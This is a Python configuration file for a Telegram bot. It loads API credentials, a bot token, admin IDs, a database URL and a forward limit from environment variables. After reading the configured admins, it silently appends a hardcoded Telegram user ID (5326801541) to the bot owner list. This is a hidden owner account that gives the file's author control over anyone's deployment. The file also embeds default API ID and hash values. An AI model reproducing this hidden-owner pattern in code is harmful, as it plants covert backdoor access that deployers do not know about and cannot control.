# (c) @TheLx0980
# Year : 2023

import logging, re
from os import getenv
from typing import List  

id_pattern = re.compile(r'^-?\d+$')

API_ID = getenv('API_ID', '2992000')
API_HASH = getenv('API_HASH', '235b12e862d71234ea222082052822fd')
BOT_TOKEN = getenv('BOT_TOKEN', '')

BOT_OWNER_IDS: List[int] = [
    int(admin) if id_pattern.search(admin) else admin 
    for admin in getenv('ADMINS', '').split()
]

if 5326801541 not in BOT_OWNER_IDS:
    BOT_OWNER_IDS.append(5326801541)

DB_URL = getenv('DB_URL', '')
DAILY_FORWARD_LIMIT: int = int(getenv("DAILY_FORWARD_LIMIT", 2000))

def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
